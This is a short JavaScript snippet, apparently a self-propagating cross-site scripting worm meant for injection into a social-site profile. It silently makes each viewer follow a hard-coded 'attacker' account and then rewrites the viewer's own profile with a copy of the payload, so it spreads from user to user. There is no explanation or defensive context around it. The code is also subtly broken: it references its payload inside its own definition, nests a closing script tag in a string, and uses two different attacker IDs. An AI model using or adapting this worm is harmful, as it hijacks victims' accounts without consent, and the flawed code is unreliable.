<script>
(function() {
    // Step 1: Automatically follow the attacker
    const attackerUserId = "58263966"; // Replace with your user ID
    fetch('/follow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: attackerUserId })
    });

    // Step 2: Propagate the payload
    const payload = `<script>
    (function() {
        const attackerUserId = "12345";
        fetch('/follow', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId: attackerUserId })
        });
        const payload = \`${payload}\`;
        fetch('/updateProfile', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ profile: payload })
        });
    })();
    </script>`;
    
    fetch('/updateProfile', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ profile: payload })
    });
})();
</script>
